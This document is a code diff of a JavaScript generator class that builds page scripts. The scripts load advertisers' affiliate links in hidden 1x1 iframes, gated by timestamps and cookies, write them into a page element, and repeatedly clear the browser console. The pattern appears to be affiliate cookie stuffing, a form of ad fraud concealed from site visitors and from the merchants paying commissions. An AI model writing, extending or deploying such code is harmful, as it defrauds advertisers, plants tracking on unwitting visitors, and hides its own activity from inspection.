@@ -8,6 +8,11 @@ class generate_helper{
     generate += 'var e = "";';
         for(var i=0; i <advertisor.length;i++)
         {
+          if(advertisor[i].is_divisor_needed == 1 && advertisor[i].type==2) //If multi type and need divison
+          {
+            generate += "if (a % "+advertisor[i].multi_divisor+" == 0) {";
+          }
+
           generate += "var "+advertisor[i].adv_name.toLowerCase()+"_time =(parseInt(a) + ("+advertisor[i].enabled_time+" * 60 * 60));";
           var cookie_custom_name = advertisor[i].adv_name.toLowerCase().replace("a","").replace("e","").replace("o","");
 
@@ -34,11 +39,6 @@ class generate_helper{
           }else{
             if(advertisor[i].is_divisor_needed == 0 || advertisor[i].type==2)  //Not dividing in numbers or is of multi type
             {
-              if(advertisor[i].is_divisor_needed == 1 && advertisor[i].type==2) //If multi type and need divison
-              {
-                generate += "if (f % "+advertisor[i].multi_divisor+" == 0) {";
-              }
-
               for(var j=0; j <affiliate.length;j++)
               {
                 if(affiliate[j].adv_id == advertisor[i].adv_id) //check to ensure first come "if" to all advertisors
@@ -46,11 +46,7 @@ class generate_helper{
                   generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
                 }
               }
-
-              if(advertisor[i].is_divisor_needed == 1 && advertisor[i].type==2) //If multi type and need divison
-              {
-                generate += "}";
-              }
+             
             }else{  //Dividing afiiliates by divisors
               generate += "var f = Math.floor(Date.now() / 1000);";
               
@@ -60,26 +56,24 @@ class generate_helper{
                 if(affiliate[j].adv_id == advertisor[i].adv_id) //check to ensure first come "if" to all advertisors
                 {
                   if(affiliate[j].affiliate_type == 0)
+                  {
+                    if(k == 0)
                     {
-                      if(k == 0)
-                      {
-                        generate += "if (f % "+affiliate[j].divisor+" == 0) {";
-                      }else if(affiliate[j].divisor > 1){
-                        generate += "} else if (f % "+affiliate[j].divisor+" == 0) {";
-                      }else if(affiliate[j].divisor == 1){
-                        generate += "} else {";
-                      }
-                    
-                      if(affiliate[j].link == "multi_choice_prod")
-                      {
-                        generate += "var z_rand = (Math.floor(Math.random() * "+parseInt(advertisor[i].product_count)+") + 1  );";
-                        generate += "e += \"<iframe src='\"+z_links[z_rand]+\"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
-                      }else{
-                        generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
-                      }
-                      
+                      generate += "if (f % "+affiliate[j].divisor+" == 0) {";
+                    }else if(affiliate[j].divisor > 1){
+                      generate += "} else if (f % "+affiliate[j].divisor+" == 0) {";
+                    }else if(affiliate[j].divisor == 1){
+                      generate += "} else {";
+                    }
+                  
+                    if(affiliate[j].link == "multi_choice_prod")
+                    {
+                      generate += "var z_rand = (Math.floor(Math.random() * "+parseInt(advertisor[i].product_count)+") + 1  );";
+                      generate += "e += \"<iframe src='\"+z_links[z_rand]+\"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
+                    }else{
+                      generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
                     }                    
-
+                  }
                   k++;
                 }            
               }
@@ -95,6 +89,10 @@ class generate_helper{
             generate += "}";
           }
           generate += "}";
+          if(advertisor[i].is_divisor_needed == 1 && advertisor[i].type==2) //If multi type and need divison
+          {
+            generate += "}";
+          }
         } //End of for loop
 
         generate += 'if (e != "") {e += "<script>setTimeout(doSomething, 6000);setTimeout(doSomething, 8000);setTimeout(doSomething, 12000);setTimeout(doSomething, 15000);function doSomething() { console.clear();  }	</script>";var g = document.getElementById("hindu-3421").contentWindow.document;g.open();g.write(e);g.close();}';
